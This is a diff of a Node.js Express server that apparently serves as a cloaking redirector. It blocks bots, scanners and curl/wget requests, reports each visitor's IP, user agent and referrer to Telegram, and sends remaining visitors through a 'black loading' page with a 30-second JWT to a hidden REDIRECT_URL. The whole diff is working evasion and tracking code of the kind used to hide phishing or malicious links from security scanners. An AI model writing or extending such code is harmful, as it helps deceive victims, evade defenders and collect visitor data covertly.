@@ -4,6 +4,7 @@ import path from "path";
 import fetch from "node-fetch";
 import fs from "fs";
 import { fileURLToPath } from "url";
+import isbot from "is-bot";
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
@@ -33,9 +34,9 @@ async function sendToTelegram(message) {
   }
 }
 
-// === Middleware: Bot/referrer checks (skip /verify) ===
+// === Middleware: Block bots + bad referrers ===
 app.use((req, res, next) => {
-  if (req.path.startsWith("/verify")) return next(); // skip checks for verify
+  if (req.path === "/healthz") return next();
 
   const ref = req.get("referer") || req.get("origin") || "";
   const ua = req.get("user-agent") || "";
@@ -49,34 +50,35 @@ app.use((req, res, next) => {
     return res.status(403).send("Forbidden: bad referrer");
   }
 
-  if (/\b(bot|crawl|spider|scanner|wget|curl|python-requests)\b/i.test(ua)) {
+  if (isbot(ua) || /\b(curl|wget|scanner|python-requests)\b/i.test(ua)) {
     status = "❌ Blocked (bot UA)";
     sendToTelegram(`${status}\nIP: ${ip}\nUA: ${ua}\nRef: ${ref || "none"}`);
-    return res.status(403).send("Forbidden: bot detected (UA)");
+    return res.status(403).send("Forbidden: bot detected");
   }
 
   sendToTelegram(`${status}\nIP: ${ip}\nUA: ${ua}\nRef: ${ref || "none"}`);
   next();
 });
 
-// === Root redirect to secure page ===
+// === Root entry ===
 app.get("/", (req, res) => {
   res.redirect("/secure-redirect");
 });
 
-// === Secure redirect: now fully server-side ===
+// === Secure redirect page (black loading) ===
 app.get("/secure-redirect", (req, res) => {
   try {
     const token = jwt.sign({ target: REDIRECT_URL }, SECRET, { expiresIn: "30s" });
-    // Direct server redirect, no token in browser HTML
-    res.redirect(`/verify?token=${token}`);
+    let html = fs.readFileSync(path.join(__dirname, "views", "redirect.html"), "utf8");
+    html = html.replace("%%TOKEN%%", token);
+    res.send(html);
   } catch (err) {
     console.error("Error signing token", err);
     res.status(500).send("Server error");
   }
 });
 
-// === Verify token and redirect ===
+// === Verify endpoint ===
 app.get("/verify", (req, res) => {
   const token = req.query.token;
   const ip = (req.headers["x-forwarded-for"] || req.socket.remoteAddress || "unknown").split(",")[0].trim();
